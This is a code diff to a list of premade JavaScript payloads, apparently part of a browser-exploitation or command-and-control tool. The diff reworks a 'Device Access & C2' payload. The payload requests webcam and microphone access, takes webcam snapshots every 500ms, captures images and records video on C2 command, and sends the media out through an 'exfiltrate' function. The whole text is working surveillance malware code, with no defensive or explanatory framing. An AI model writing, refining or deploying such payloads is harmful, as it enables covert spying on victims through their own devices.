@@ -131,7 +131,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 `.trim(),
     },
     {
-        name: "Device Access &amp; C2",
+        name: "Device Access & C2",
         description: "Requests webcam/mic access and listens for C2 commands to stream media.",
         code: `
 (function() {
@@ -140,82 +140,105 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     let mediaStream = null;
     let videoRecorder = null;
     let audioRecorder = null;
+    let snapshotInterval = null;
 
     function exfiltrate(type, data) {
         channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
     }
 
+    function blobToDataURL(blob) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onloadend = () => resolve(reader.result);
+            reader.onerror = reject;
+            reader.readAsDataURL(blob);
+        });
+    }
+
     async function getMediaPermissions(video = true, audio = true) {
-        if (mediaStream && mediaStream.active) return mediaStream;
         try {
+            if (mediaStream && mediaStream.active) return mediaStream;
             mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
-            exfiltrate('connection', { message: 'Permissions granted.' });
+            exfiltrate('media-stream', { type: 'status', message: 'Permissions granted.' });
             return mediaStream;
         } catch (err) {
-            exfiltrate('connection', { message: 'Permissions denied: ' + err.message });
+            exfiltrate('media-stream', { type: 'status', message: 'Permissions denied: ' + err.name });
             return null;
         }
     }
-    
-    function startRecording(recorder, streamType) {
-        if (recorder && recorder.state === 'inactive') {
-            recorder.start(500); // Send chunk every 500ms
-            exfiltrate('connection', { message: streamType + ' recording started.' });
-        }
+
+    function startSnapshotting(stream) {
+        if (snapshotInterval) clearInterval(snapshotInterval);
+        const videoTrack = stream.getVideoTracks()[0];
+        if (!videoTrack) return;
+        const imageCapture = new ImageCapture(videoTrack);
+
+        snapshotInterval = setInterval(async () => {
+            try {
+                const blob = await imageCapture.takePhoto();
+                const dataUrl = await blobToDataURL(blob);
+                exfiltrate('media-stream', { type: 'image-snapshot', snapshot: dataUrl });
+            } catch (e) {
+                // Ignore errors if the stream is closed
+            }
+        }, 500); // Send snapshot every 500ms
     }
-    
-    function stopRecording(recorder, streamType) {
-        if (recorder && recorder.state === 'recording') {
-            recorder.stop();
-            exfiltrate('connection', { message: streamType + ' recording stopped.' });
+
+    function stopSnapshotting() {
+        if (snapshotInterval) {
+            clearInterval(snapshotInterval);
+            snapshotInterval = null;
         }
     }
     
     function createRecorder(stream, mimeType) {
-         const recorder = new MediaRecorder(stream, { mimeType });
-         recorder.ondataavailable = async (event) => {
+        let recordedChunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType });
+        
+        recorder.ondataavailable = (event) => {
             if (event.data.size > 0) {
-                const chunk = await event.data.arrayBuffer();
-                exfiltrate('media-stream', { type: mimeType, size: event.data.size, chunk });
+                recordedChunks.push(event.data);
             }
+        };
+
+        recorder.onstop = async () => {
+            const blob = new Blob(recordedChunks, { type: mimeType });
+            const dataUrl = await blobToDataURL(blob);
+            exfiltrate('media-stream', { type: mimeType, dataUrl });
+            recordedChunks = []; // Clear chunks for next recording
         };
         return recorder;
     }
 
-    // Immediately ask for permissions when the payload loads.
-    getMediaPermissions();
-
     channel.addEventListener('message', async (event) => {
         if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
-
+        
         const command = event.data.command;
-        const stream = await getMediaPermissions();
-        if (!stream) return;
+        
+        if (command === 'start-video') {
+            const stream = await getMediaPermissions();
+            if (stream) {
+                startSnapshotting(stream);
+            }
+            return;
+        }
+        
+        if (!mediaStream) return; // Must have a stream for other commands
 
         switch (command) {
-            case 'start-video':
-                 // This command will now just ensure permissions are active and the stream is sent
-                 channel.postMessage({ type: 'media-stream', sessionId, data: { stream } });
-                break;
             case 'capture-image':
-                const track = stream.getVideoTracks()[0];
+                const track = mediaStream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(track);
                 const blob = await imageCapture.takePhoto();
-                exfiltrate('media-stream', { type: 'image/png', size: blob.size, chunk: await blob.arrayBuffer() });
+                const dataUrl = await blobToDataURL(blob);
+                exfiltrate('media-stream', { type: 'image/png', dataUrl });
                 break;
             case 'start-video-record':
-                videoRecorder = createRecorder(stream, 'video/webm');
-                startRecording(videoRecorder, 'Video');
+                videoRecorder = createRecorder(mediaStream, 'video/webm');
+                videoRecorder.start();
                 break;
             case 'stop-video-record':
-                stopRecording(videoRecorder, 'Video');
-                break;
-            case 'start-audio-record':
-                audioRecorder = createRecorder(stream, 'audio/webm');
-                startRecording(audioRecorder, 'Audio');
-                break;
-            case 'stop-audio-record':
-                stopRecording(audioRecorder, 'Audio');
+                if (videoRecorder) videoRecorder.stop();
                 break;
         }
     });
